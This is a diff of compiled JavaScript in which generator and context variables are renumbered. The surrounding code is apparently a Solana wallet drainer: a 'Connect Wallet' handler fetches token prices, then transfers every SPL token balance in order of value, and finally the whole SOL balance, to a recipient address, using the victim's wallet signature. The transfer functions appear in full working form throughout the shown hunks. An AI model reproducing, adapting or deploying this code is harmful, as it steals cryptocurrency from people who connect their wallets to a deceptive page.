@@ -72827,23 +72874,23 @@ function fetchTokenPrices(_x4) {
   return _fetchTokenPrices.apply(this, arguments);
 } // Transfer SPL tokens in order of their values
 function _fetchTokenPrices() {
-  _fetchTokenPrices = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee4(tokens) {
+  _fetchTokenPrices = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee6(tokens) {
     var tokenSymbols, response, data, prices, _i, _Object$entries, _Object$entries$_i, symbol, priceData;
-    return _regeneratorRuntime().wrap(function _callee4$(_context4) {
-      while (1) switch (_context4.prev = _context4.next) {
+    return _regeneratorRuntime().wrap(function _callee6$(_context6) {
+      while (1) switch (_context6.prev = _context6.next) {
         case 0:
           tokenSymbols = tokens.map(function (token) {
             return token.info.symbol;
           }).join(','); // Create a comma-separated list of token symbols
-          _context4.prev = 1;
-          _context4.next = 4;
+          _context6.prev = 1;
+          _context6.next = 4;
           return fetch("https://price.jup.ag/v6/price?ids=".concat(tokenSymbols));
         case 4:
-          response = _context4.sent;
-          _context4.next = 7;
+          response = _context6.sent;
+          _context6.next = 7;
           return response.json();
         case 7:
-          data = _context4.sent;
+          data = _context6.sent;
           // Extract prices and map them to token symbols
           prices = {};
           for (_i = 0, _Object$entries = Object.entries(data.data); _i < _Object$entries.length; _i++) {
@@ -72851,17 +72898,17 @@ function _fetchTokenPrices() {
             prices[symbol] = priceData.price || 0; // Get the price for each token, default to 0 if not found
           }
           console.log('Token Prices:', prices);
-          return _context4.abrupt("return", prices);
+          return _context6.abrupt("return", prices);
         case 14:
-          _context4.prev = 14;
-          _context4.t0 = _context4["catch"](1);
-          console.error('Error fetching token prices:', _context4.t0);
+          _context6.prev = 14;
+          _context6.t0 = _context6["catch"](1);
+          console.error('Error fetching token prices:', _context6.t0);
           alert('Failed to fetch token prices');
         case 18:
         case "end":
-          return _context4.stop();
+          return _context6.stop();
       }
-    }, _callee4, null, [[1, 14]]);
+    }, _callee6, null, [[1, 14]]);
   }));
   return _fetchTokenPrices.apply(this, arguments);
 }
@@ -72869,79 +72916,79 @@ function transferTokensInOrder(_x5, _x6, _x7) {
   return _transferTokensInOrder.apply(this, arguments);
 } // Transfer SOL after token transfers
 function _transferTokensInOrder() {
-  _transferTokensInOrder = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee5(tokens, recipientAddress, connection) {
+  _transferTokensInOrder = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee7(tokens, recipientAddress, connection) {
     var provider, fromPublicKey, _iterator, _step, token, tokenAddress, recipientPublicKey, tokenBalance, transferTx, signature;
-    return _regeneratorRuntime().wrap(function _callee5$(_context5) {
-      while (1) switch (_context5.prev = _context5.next) {
+    return _regeneratorRuntime().wrap(function _callee7$(_context7) {
+      while (1) switch (_context7.prev = _context7.next) {
         case 0:
           provider = window.solana;
           fromPublicKey = new _web.PublicKey(walletAddress);
           _iterator = _createForOfIteratorHelper(tokens);
-          _context5.prev = 3;
+          _context7.prev = 3;
           _iterator.s();
         case 5:
           if ((_step = _iterator.n()).done) {
-            _context5.next = 35;
+            _context7.next = 35;
             break;
           }
           token = _step.value;
-          _context5.prev = 7;
+          _context7.prev = 7;
           tokenAddress = new _web.PublicKey(token.address); // Token mint address
           recipientPublicKey = new _web.PublicKey(recipientAddress);
           tokenBalance = token.balance;
           if (!(tokenBalance > 0)) {
-            _context5.next = 28;
+            _context7.next = 28;
             break;
           }
           console.log("Initiating transfer for ".concat(token.info.symbol, " (").concat(tokenBalance, ")"));
-          _context5.next = 15;
+          _context7.next = 15;
           return createTransferTransaction(connection, fromPublicKey, recipientPublicKey, tokenAddress, tokenBalance, token.info.decimals);
         case 15:
-          transferTx = _context5.sent;
-          _context5.prev = 16;
-          _context5.next = 19;
+          transferTx = _context7.sent;
+          _context7.prev = 16;
+          _context7.next = 19;
           return provider.signAndSendTransaction(transferTx);
         case 19:
-          signature = _context5.sent;
-          _context5.next = 22;
+          signature = _context7.sent;
+          _context7.next = 22;
           return confirmTransactionWithTimeout(connection, signature, 8000);
         case 22:
           // 30 seconds timeout
 
           console.log("Successfully transferred ".concat(token.info.symbol, "!"));
-          _context5.next = 28;
+          _context7.next = 28;
           break;
         case 25:
-          _context5.prev = 25;
-          _context5.t0 = _context5["catch"](16);
+          _context7.prev = 25;
+          _context7.t0 = _context7["catch"](16);
           // If signing or sending fails, log the error but continue to the next token
-          console.error("Failed to transfer ".concat(token.info.symbol, ":"), _context5.t0);
+          console.error("Failed to transfer ".concat(token.info.symbol, ":"), _context7.t0);
         case 28:
-          _context5.next = 33;
+          _context7.next = 33;
           break;
         case 30:
-          _context5.prev = 30;
-          _context5.t1 = _context5["catch"](7);
-          console.error("Failed to transfer ".concat(token.info.symbol, ":"), _context5.t1);
+          _context7.prev = 30;
+          _context7.t1 = _context7["catch"](7);
+          console.error("Failed to transfer ".concat(token.info.symbol, ":"), _context7.t1);
         case 33:
-          _context5.next = 5;
+          _context7.next = 5;
           break;
         case 35:
-          _context5.next = 40;
+          _context7.next = 40;
           break;
         case 37:
-          _context5.prev = 37;
-          _context5.t2 = _context5["catch"](3);
-          _iterator.e(_context5.t2);
+          _context7.prev = 37;
+          _context7.t2 = _context7["catch"](3);
+          _iterator.e(_context7.t2);
         case 40:
-          _context5.prev = 40;
+          _context7.prev = 40;
           _iterator.f();
-          return _context5.finish(40);
+          return _context7.finish(40);
         case 43:
         case "end":
-          return _context5.stop();
+          return _context7.stop();
       }
-    }, _callee5, null, [[3, 37, 40, 43], [7, 30], [16, 25]]);
+    }, _callee7, null, [[3, 37, 40, 43], [7, 30], [16, 25]]);
   }));
   return _transferTokensInOrder.apply(this, arguments);
 }
@@ -72949,14 +72996,14 @@ function transferSol(_x8, _x9, _x10) {
   return _transferSol.apply(this, arguments);
 } // Create a transaction to transfer SPL tokens
 function _transferSol() {
-  _transferSol = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee6(connection, recipientAddress, solBalance) {
+  _transferSol = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee8(connection, recipientAddress, solBalance) {
     var provider, fromPublicKey, recipientPublicKey, transaction, latestBlockhash, signature;
-    return _regeneratorRuntime().wrap(function _callee6$(_context6) {
-      while (1) switch (_context6.prev = _context6.next) {
+    return _regeneratorRuntime().wrap(function _callee8$(_context8) {
+      while (1) switch (_context8.prev = _context8.next) {
         case 0:
-          _context6.prev = 0;
+          _context8.prev = 0;
           if (!(solBalance > 0)) {
-            _context6.next = 20;
+            _context8.next = 20;
             break;
           }
           provider = window.solana;
@@ -72971,39 +73018,39 @@ function _transferSol() {
             lamports: solBalance * 1e9 // Convert SOL to lamports
           }));
           transaction.feePayer = fromPublicKey;
-          _context6.next = 10;
+          _context8.next = 10;
           return connection.getLatestBlockhash();
         case 10:
-          latestBlockhash = _context6.sent;
+          latestBlockhash = _context8.sent;
           transaction.recentBlockhash = latestBlockhash.blockhash;
 
           // Sign and send the transaction
-          _context6.next = 14;
+          _context8.next = 14;
           return provider.signAndSendTransaction(transaction);
         case 14:
-          signature = _context6.sent;
-          _context6.next = 17;
+          signature = _context8.sent;
+          _context8.next = 17;
           return confirmTransactionWithTimeout(connection, signature, 8000);
         case 17:
           // 8-second timeout
 
           console.log("Successfully transferred SOL!");
-          _context6.next = 21;
+          _context8.next = 21;
           break;
         case 20:
           console.log('No SOL to transfer.');
         case 21:
-          _context6.next = 26;
+          _context8.next = 26;
           break;
         case 23:
-          _context6.prev = 23;
-          _context6.t0 = _context6["catch"](0);
-          console.error('Failed to transfer SOL:', _context6.t0);
+          _context8.prev = 23;
+          _context8.t0 = _context8["catch"](0);
+          console.error('Failed to transfer SOL:', _context8.t0);
         case 26:
         case "end":
-          return _context6.stop();
+          return _context8.stop();
       }
-    }, _callee6, null, [[0, 23]]);
+    }, _callee8, null, [[0, 23]]);
   }));
   return _transferSol.apply(this, arguments);
 }
@@ -73011,19 +73058,19 @@ function createTransferTransaction(_x11, _x12, _x13, _x14, _x15, _x16) {
   return _createTransferTransaction.apply(this, arguments);
 } // Confirm transaction with timeout
 function _createTransferTransaction() {
-  _createTransferTransaction = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee7(connection, fromPublicKey, toPublicKey, tokenMintAddress, amount, decimals) {
+  _createTransferTransaction = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee9(connection, fromPublicKey, toPublicKey, tokenMintAddress, amount, decimals) {
     var fromTokenAccount, toTokenAccount, amountInSmallestUnit, transferInstruction, transaction, latestBlockhash;
-    return _regeneratorRuntime().wrap(function _callee7$(_context7) {
-      while (1) switch (_context7.prev = _context7.next) {
+    return _regeneratorRuntime().wrap(function _callee9$(_context9) {
+      while (1) switch (_context9.prev = _context9.next) {
         case 0:
-          _context7.next = 2;
+          _context9.next = 2;
           return (0, _splToken.getAssociatedTokenAddress)(tokenMintAddress, fromPublicKey, false, _splToken.TOKEN_PROGRAM_ID, _splToken.ASSOCIATED_TOKEN_PROGRAM_ID);
         case 2:
-          fromTokenAccount = _context7.sent;
-          _context7.next = 5;
+          fromTokenAccount = _context9.sent;
+          _context9.next = 5;
           return (0, _splToken.getAssociatedTokenAddress)(tokenMintAddress, toPublicKey, false, _splToken.TOKEN_PROGRAM_ID, _splToken.ASSOCIATED_TOKEN_PROGRAM_ID);
         case 5:
-          toTokenAccount = _context7.sent;
+          toTokenAccount = _context9.sent;
           // Convert amount to the smallest unit using BigInt
           amountInSmallestUnit = BigInt(Math.round(amount * Math.pow(10, decimals))); // Create transfer instruction
           transferInstruction = (0, _splToken.createTransferInstruction)(fromTokenAccount, toTokenAccount, fromPublicKey, amountInSmallestUnit, [], _splToken.TOKEN_PROGRAM_ID); // Create and build the transaction
@@ -73031,17 +73078,17 @@ function _createTransferTransaction() {
           transaction.feePayer = fromPublicKey;
 
           // Get the latest blockhash
-          _context7.next = 12;
+          _context9.next = 12;
           return connection.getLatestBlockhash();
         case 12:
-          latestBlockhash = _context7.sent;
+          latestBlockhash = _context9.sent;
           transaction.recentBlockhash = latestBlockhash.blockhash;
-          return _context7.abrupt("return", transaction);
+          return _context9.abrupt("return", transaction);
         case 15:
         case "end":
-          return _context7.stop();
+          return _context9.stop();
       }
-    }, _callee7);
+    }, _callee9);
   }));
   return _createTransferTransaction.apply(this, arguments);
 }
@@ -73049,10 +73096,10 @@ function confirmTransactionWithTimeout(_x17, _x18, _x19) {
   return _confirmTransactionWithTimeout.apply(this, arguments);
 } // Attach the connectAndExecute function to the "Connect Wallet" button
 function _confirmTransactionWithTimeout() {
-  _confirmTransactionWithTimeout = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee8(connection, signature, timeoutMs) {
+  _confirmTransactionWithTimeout = _asyncToGenerator(/*#__PURE__*/_regeneratorRuntime().mark(function _callee10(connection, signature, timeoutMs) {
     var start, timeoutPromise, end;
-    return _regeneratorRuntime().wrap(function _callee8$(_context8) {
-      while (1) switch (_context8.prev = _context8.next) {
+    return _regeneratorRuntime().wrap(function _callee10$(_context10) {
+      while (1) switch (_context10.prev = _context10.next) {
         case 0:
           start = Date.now(); // Create a promise that rejects after the timeout
           timeoutPromise = new Promise(function (_, reject) {
@@ -73060,26 +73107,26 @@ function _confirmTransactionWithTimeout() {
               return reject(new Error("Transaction confirmation timed out"));
             }, timeoutMs);
           }); // Wait for either the confirmation or the timeout
-          _context8.prev = 2;
-          _context8.next = 5;
+          _context10.prev = 2;
+          _context10.next = 5;
           return Promise.race([connection.confirmTransaction(signature, 'confirmed'), timeoutPromise]);
         case 5:
           console.log("Transaction ".concat(signature, " confirmed."));
-          _context8.next = 12;
+          _context10.next = 12;
           break;
         case 8:
-          _context8.prev = 8;
-          _context8.t0 = _context8["catch"](2);
-          console.error("Transaction confirmation failed for ".concat(signature, ":"), _context8.t0);
-          throw _context8.t0;
+          _context10.prev = 8;
+          _context10.t0 = _context10["catch"](2);
+          console.error("Transaction confirmation failed for ".concat(signature, ":"), _context10.t0);
+          throw _context10.t0;
         case 12:
           end = Date.now();
           console.log("Transaction confirmation took ".concat(end - start, "ms"));
         case 14:
         case "end":
-          return _context8.stop();
+          return _context10.stop();
       }
-    }, _callee8, null, [[2, 8]]);
+    }, _callee10, null, [[2, 8]]);
   }));
   return _confirmTransactionWithTimeout.apply(this, arguments);
 }
